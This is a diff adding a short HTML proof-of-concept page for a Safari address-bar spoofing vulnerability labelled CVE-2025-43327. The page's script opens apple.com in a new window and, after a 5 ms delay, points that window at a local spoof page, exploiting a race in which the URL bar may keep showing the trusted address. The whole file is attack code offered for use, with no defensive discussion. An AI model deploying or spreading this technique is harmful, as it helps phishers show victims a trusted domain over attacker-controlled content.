@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2025-43327 PoC Trigger</title>
+</head>
+<body>
+    <h1>Safari Address Bar Spoofing PoC</h1>
+    <button onclick="startSpoof()">Click to Test Spoof</button>
+
+    <script>
+        function startSpoof() {
+            // Step 1: Open a trusted URL
+            // In a real exploit, this might be a legitimate site
+            var victim = window.open("https://www.apple.com", "spoofed_window");
+
+            // Step 2: Use a timing-based race condition to inject content
+            // The vulnerability often lies in Safari failing to update the URL 
+            // bar if the location is changed immediately during the load.
+            setTimeout(function() {
+                try {
+                    victim.location = "spoof.html";
+                } catch(e) {
+                    console.log("Cross-origin restriction might apply depending on exact sub-version");
+                }
+            }, 5); // Micro-timing adjustment
+        }
+    </script>
+</body>
+</html>
